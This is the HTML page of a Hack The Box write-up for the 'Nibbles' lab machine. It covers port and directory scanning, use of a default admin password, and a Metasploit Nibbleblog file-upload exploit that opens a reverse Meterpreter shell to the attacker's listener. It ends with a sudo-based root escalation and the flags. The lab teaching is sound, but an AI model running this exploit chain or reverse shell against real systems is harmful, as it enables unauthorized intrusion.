<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Writeup: Nibbles | woadey</title>
<meta name=keywords content="htb,hackthebox,writeup,Nibbles"><meta name=description content="Writeup for Hack The Box – Nibbles"><meta name=author content><link rel=canonical href=https://woadey.xyz/posts/htb/easy/nibbles/><link crossorigin=anonymous href=/assets/css/stylesheet.e76b59a14721d0cb564e08439ed17c421e12b5639ca65079070ec645ce8a18ba.css integrity="sha256-52tZoUch0MtWTghDntF8Qh4StWOcplB5Bw7GRc6KGLo=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.xyz/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR",{anonymize_ip:!1})}</script><meta property="og:title" content="HTB Writeup: Nibbles"><meta property="og:description" content="Writeup for Hack The Box – Nibbles"><meta property="og:type" content="article"><meta property="og:url" content="https://woadey.xyz/posts/htb/easy/nibbles/"><meta property="og:image" content="https://woadey.xyz/posts/htb/easy/nibbles/images/nibbles.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-11-13T14:19:47-05:00"><meta property="article:modified_time" content="2023-11-13T14:19:47-05:00"><meta property="og:site_name" content="woadey's blog"><meta name=twitter:title content="HTB Writeup: Nibbles"><meta name=twitter:description content="Writeup for Hack The Box – Nibbles"><meta name=twitter:site content="@woadey_"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://woadey.xyz/posts/htb/easy/nibbles/images/nibbles.png"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.xyz/posts/"},{"@type":"ListItem","position":2,"name":"HTB Writeup: Nibbles","item":"https://woadey.xyz/posts/htb/easy/nibbles/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Writeup: Nibbles","name":"HTB Writeup: Nibbles","description":"Writeup for Hack The Box – Nibbles","keywords":["htb","hackthebox","writeup","Nibbles"],"articleBody":"nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.93 scan initiated Mon Nov 13 19:59:42 2023 as: nmap -sC -sV -oA nmap/nibbles -T4 10.129.118.233 Nmap scan report for 10.129.118.233 Host is up (0.038s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 13 19:59:50 2023 -- 1 IP address (1 host up) scanned in 7.33 seconds gobuster 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ┌──(kali㉿kali)-[~/htb/busqueda] └─$ sudo gobuster dir -u http://10.129.118.233 -w /usr/share/dirb/wordlists/common.txt -z =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.118.233 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/11/13 20:15:10 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 293] /.htaccess (Status: 403) [Size: 298] /.htpasswd (Status: 403) [Size: 298] /index.html (Status: 200) [Size: 93] /server-status (Status: 403) [Size: 302] =============================================================== 2023/11/13 20:15:11 Finished =============================================================== http gobuster 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ┌──(kali㉿kali)-[~/htb/busqueda] └─$ sudo gobuster dir -u http://10.129.118.233/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt -z =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.118.233/nibbleblog/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/11/13 20:17:08 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 309] /.hta (Status: 403) [Size: 304] /.htpasswd (Status: 403) [Size: 309] /admin (Status: 301) [Size: 327] [--\u003e http://10.129.118.233/nibbleblog/admin/] /admin.php (Status: 200) [Size: 1401] /content (Status: 301) [Size: 329] [--\u003e http://10.129.118.233/nibbleblog/content/] /index.php (Status: 200) [Size: 2987] /languages (Status: 301) [Size: 331] [--\u003e http://10.129.118.233/nibbleblog/languages/] /plugins (Status: 301) [Size: 329] [--\u003e http://10.129.118.233/nibbleblog/plugins/] /README (Status: 200) [Size: 4628] /themes (Status: 301) [Size: 328] [--\u003e http://10.129.118.233/nibbleblog/themes/] =============================================================== 2023/11/13 20:17:09 Finished =============================================================== searchsploit ---------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------- --------------------------------- Nibbleblog 3 - Multiple SQL Injections | php/webapps/35865.txt Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb ---------------------------------------------------------- --------------------------------- After seeing this, I Google the default password for nibbleblog and found admin:nibbles. This, of coure, worked.\nThen I was able to upload a reverse PHP shell using the image Plugins within the nibbleblog portal.\nmetasploit msf6 \u003e search nibbleblog Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/nibbleblog_file_upload 2015-09-01 excellent Yes Nibbleblog File Upload Vulnerability Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload msf6 \u003e use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(multi/http/nibbleblog_file_upload) \u003e show options Module options (exploit/multi/http/nibbleblog_file_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes The password to authenticate with Proxies no A proxy chain of format type:host:por t[,type:host:port][...] RHOSTS yes The target host(s), see https://docs. metasploit.com/docs/using-metasploit/ basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connec tions TARGETURI / yes The base path to the web application USERNAME yes The username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 209.151.148.245 yes The listen address (an interface may be s pecified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Nibbleblog 4.0.3 View the full module info with the info, or info -d command. msf6 exploit(multi/http/nibbleblog_file_upload) \u003e We’ve got everything we need. Now Just have to configure the options.\nmsf6 exploit(multi/http/nibbleblog_file_upload) \u003e set rhost 10.129.118.233 lhost =\u003e 10.129.118.233 msf6 exploit(multi/http/nibbleblog_file_upload) \u003e set lhost 10.10.15.26 rhost =\u003e 10.10.15.26 msf6 exploit(multi/http/nibbleblog_file_upload) \u003e set username admin username =\u003e admin msf6 exploit(multi/http/nibbleblog_file_upload) \u003e set password nibbles password =\u003e nibbles msf6 exploit(multi/http/nibbleblog_file_upload) \u003e set targeturi nibbleblog/ targeturi =\u003e nibbleblog/ msf6 exploit(multi/http/nibbleblog_file_upload) \u003e run [*] Started reverse TCP handler on 10.10.15.26:4444 [*] Sending stage (39927 bytes) to 10.129.118.233 [+] Deleted image.php [*] Meterpreter session 1 opened (10.10.15.26:4444 -\u003e 10.129.118.233:37544) at 2023-11-13 21:15:55 +0000 meterpreter\u003e sysinfo Computer : Nibbles OS : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 Meterpreter : php/linux meterpreter\u003e \u003e execute -if \"cat /home/*/user.txt\" Process 1691 created. Channel 3 created. 79c03865431abf47b90ef24b9695e148 privesc $ sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh Welp that’s easy. Put whatever you want in monitor.sh (revshell, cmds, etc) and have root privs.\nFlags user.txt: 79c03865431abf47b90ef24b9695e148\nroot.txt: de5e5d6619862a8aa5b9b212314e0cdd\n","wordCount":"835","inLanguage":"en","image":"https://woadey.xyz/images/nibbles.png","datePublished":"2023-11-13T14:19:47-05:00","dateModified":"2023-11-13T14:19:47-05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.xyz/posts/htb/easy/nibbles/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.xyz/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.xyz/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu5661c188f24668226bb80c6208008ab1_117796_0x32_resize_q75_h2_box.webp 32w, /images/pink_hu5661c188f24668226bb80c6208008ab1_117796_64x0_resize_q75_h2_box.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://woadey.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.xyz/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.xyz/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.xyz/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.xyz/>home</a>&nbsp;»&nbsp;<a href=https://woadey.xyz/posts/>posts</a></div><h1 class=post-title>HTB Writeup: Nibbles</h1><div class=post-description>Writeup for Hack The Box – <a href=https://app.hackthebox.com/machines/121/information title=Nibbles target=_blank rel="nofollow noopener">Nibbles</a></div><div class=post-meta><span title='2023-11-13 14:19:47 -0500 -0500'>November 13, 2023</span>&nbsp;·&nbsp;4 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#nmap>nmap</a></li><li><a href=#gobuster>gobuster</a></li><li><a href=#http>http</a></li><li><a href=#gobuster-1>gobuster</a></li><li><a href=#searchsploit>searchsploit</a></li><li><a href=#metasploit>metasploit</a></li><li><a href=#privesc>privesc</a></li><li><a href=#flags>Flags</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.93 scan initiated Mon Nov 13 19:59:42 2023 as: nmap -sC -sV -oA nmap/nibbles -T4 10.129.118.233</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.118.233
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.038s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> c4f8ade8f80477decf150d630a187e49 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 228fb197bf0f1708fc7e2c8fe9773a48 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> e6ac27a3b5a9f1123c34a55d5beb3de9 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.18 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Mon Nov 13 19:59:50 2023 -- 1 IP address (1 host up) scanned in 7.33 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=gobuster>gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/busqueda<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sudo gobuster dir -u http://10.129.118.233 -w /usr/share/dirb/wordlists/common.txt -z
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.118.233
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/11/13 20:15:10 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 293<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 93<span class=o>]</span> 
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>
</span></span><span class=line><span class=cl>                                               
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/11/13 20:15:11 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=http>http<a hidden class=anchor aria-hidden=true href=#http>#</a></h3><p><figure class=image-caption><img src=images/source.png alt=html loading=lazy><figcaption></figcaption></figure><figure class=image-caption><img alt=nibbs srcset="/posts/htb/easy/nibbles/images/nibbs.i_huae4c41ff4b2585598d51243ddafb25c8_71352_480x0_resize_q75_h2_box_3.webp 480w,
/posts/htb/easy/nibbles/images/nibbs.i_huae4c41ff4b2585598d51243ddafb25c8_71352_768x0_resize_q75_h2_box_3.webp 768w,
/posts/htb/easy/nibbles/images/nibbs.i_huae4c41ff4b2585598d51243ddafb25c8_71352_1024x0_resize_q75_h2_box_3.webp 1024w" sizes=100vw src=images/nibbs.i.png width=768 height=567 loading=lazy style=filter:var(--invert-img)><figcaption></figcaption></figure></p><h3 id=gobuster-1>gobuster<a hidden class=anchor aria-hidden=true href=#gobuster-1>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/busqueda<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sudo gobuster dir -u http://10.129.118.233/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt -z
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.118.233/nibbleblog/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/11/13 20:17:08 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 309<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 304<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 309<span class=o>]</span>
</span></span><span class=line><span class=cl>/admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 327<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.118.233/nibbleblog/admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/admin.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1401<span class=o>]</span>                                             
</span></span><span class=line><span class=cl>/content              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 329<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.118.233/nibbleblog/content/<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2987<span class=o>]</span>                                               
</span></span><span class=line><span class=cl>/languages            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 331<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.118.233/nibbleblog/languages/<span class=o>]</span>
</span></span><span class=line><span class=cl>/plugins              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 329<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.118.233/nibbleblog/plugins/<span class=o>]</span>  
</span></span><span class=line><span class=cl>/README               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4628<span class=o>]</span>                                                 
</span></span><span class=line><span class=cl>/themes               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.118.233/nibbleblog/themes/<span class=o>]</span>   
</span></span><span class=line><span class=cl>                                                                                                 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/11/13 20:17:09 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=searchsploit>searchsploit<a hidden class=anchor aria-hidden=true href=#searchsploit>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>---------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                            <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>---------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Nibbleblog <span class=m>3</span> - Multiple SQL Injections                    <span class=p>|</span> php/webapps/35865.txt
</span></span><span class=line><span class=cl>Nibbleblog 4.0.3 - Arbitrary File Upload <span class=o>(</span>Metasploit<span class=o>)</span>     <span class=p>|</span> php/remote/38489.rb
</span></span><span class=line><span class=cl>---------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>After seeing this, I Google the default password for nibbleblog and found <code>admin:nibbles</code>. This, of coure, worked.</p><p>Then I was able to upload a <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php title="reverse PHP shell" target=_blank rel="nofollow noopener">reverse PHP shell</a> using the image <code>Plugins</code> within the nibbleblog portal.</p><h3 id=metasploit>metasploit<a hidden class=anchor aria-hidden=true href=#metasploit>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>msf6 &gt; search nibbleblog
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                       Disclosure Date  Rank       Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                       ---------------  ----       -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 0, use <span class=m>0</span> or use exploit/multi/http/nibbleblog_file_upload
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 &gt; use <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nibbleblog_file_upload<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/multi/http/nibbleblog_file_upload<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name       Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----       ---------------  --------  -----------
</span></span><span class=line><span class=cl>   PASSWORD                    yes       The password to authenticate with
</span></span><span class=line><span class=cl>   Proxies                     no        A proxy chain of format type:host:por
</span></span><span class=line><span class=cl>                                         t<span class=o>[</span>,type:host:port<span class=o>][</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>   RHOSTS                      yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.
</span></span><span class=line><span class=cl>                                         metasploit.com/docs/using-metasploit/
</span></span><span class=line><span class=cl>                                         basics/using-metasploit.html
</span></span><span class=line><span class=cl>   RPORT      <span class=m>80</span>               yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>   SSL        <span class=nb>false</span>            no        Negotiate SSL/TLS <span class=k>for</span> outgoing connec
</span></span><span class=line><span class=cl>                                         tions
</span></span><span class=line><span class=cl>   TARGETURI  /                yes       The base path to the web application
</span></span><span class=line><span class=cl>   USERNAME                    yes       The username to authenticate with
</span></span><span class=line><span class=cl>   VHOST                       no        HTTP server virtual host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>php/meterpreter/reverse_tcp<span class=o>)</span>:
